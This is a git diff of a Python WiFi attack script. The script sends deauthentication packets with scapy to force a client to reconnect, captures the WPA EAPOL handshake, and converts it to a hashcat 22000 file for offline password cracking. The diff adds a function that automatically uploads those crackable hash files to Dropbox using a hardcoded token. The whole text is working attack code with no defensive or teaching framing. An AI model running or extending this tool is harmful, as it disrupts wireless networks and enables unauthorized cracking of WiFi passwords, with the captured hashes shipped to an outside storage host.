@@ -5,6 +5,8 @@ import subprocess
 import threading
 import time
 from datetime import datetime
+
+import dropbox as dropbox
 from scapy.layers.dot11 import Dot11Deauth, RadioTap, Dot11
 from scapy.layers.eap import EAPOL
 from scapy.sendrecv import sendp, sniff
@@ -44,7 +46,7 @@ def check_args():
 
 def sniffer():
     print(f"{bcolors.HEADER}[*] Running...{bcolors.ENDC}")
-    sniff(iface=iface, prn=packethandler, timeout=10)
+    sniff(iface=iface, prn=packethandler, timeout=5)
 
 
 def packethandler(pkt):
@@ -71,17 +73,36 @@ def send_deauth_packet():
     sendp(pkt1, count=deauth_count, iface=iface, verbose=False)
 
 
+def dropbox_uploader():
+    dbx = dropbox.Dropbox('xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')
+    rootdir = os.getcwd()
+    print("Attempting to upload...")
+    for dir, dirs, files in os.walk(rootdir):
+        for file in files:
+            if file.endswith('.22000'):
+                try:
+                    file_path = os.path.join(dir, file)
+                    dest_path = os.path.join('/', file)
+                    print('Uploading %s to %s' % (file_path, dest_path))
+                    with open(file_path,'rb') as f:
+                        dbx.files_upload(f.read(), dest_path, mute=True)
+                except Exception as err:
+                    print("Failed to upload %s\n%s" % (file, err))
+
+                print("Finished upload.")
+
+
 if __name__ == '__main__':
     iface, ap, client, channel, deauth_count, pcap_file = check_args()
     pcap_file = os.path.splitext(pcap_file)[0] + '_' + datetime.now().strftime("%Y_%m_%d-%H-%M-%S") + '.pcap'
-    os.system('iwconfig %s channel %s' % (iface, channel))
-    t = threading.Thread(target=sniffer)
+    os.system('iwconfig %s channel %s' % (iface, channel)) # Set WiFi Adapter On right Channel
+    t = threading.Thread(target=sniffer) # Start Sniffing in backgroud.
     t.start()
-    time.sleep(2)
+    time.sleep(2) # Wait 2 seconds for sniffing to start.
     send_deauth_packet()
     print(f"{bcolors.OKBLUE}Sent %s Deauth Packet(s){bcolors.ENDC}" % deauth_count)
     t.join()
     print(f"{bcolors.WARNING}Captured Total %s EAPOL Packets{bcolors.ENDC}" %(len(packet_list)), '\n')
     print('Packets Written to: %s' %(os.getcwd()+'/'+pcap_file))
     cap_converter() # Function that converts pcap to hashcat 22000 mode.
-
+    dropbox_uploader() #Automatic hash uploader
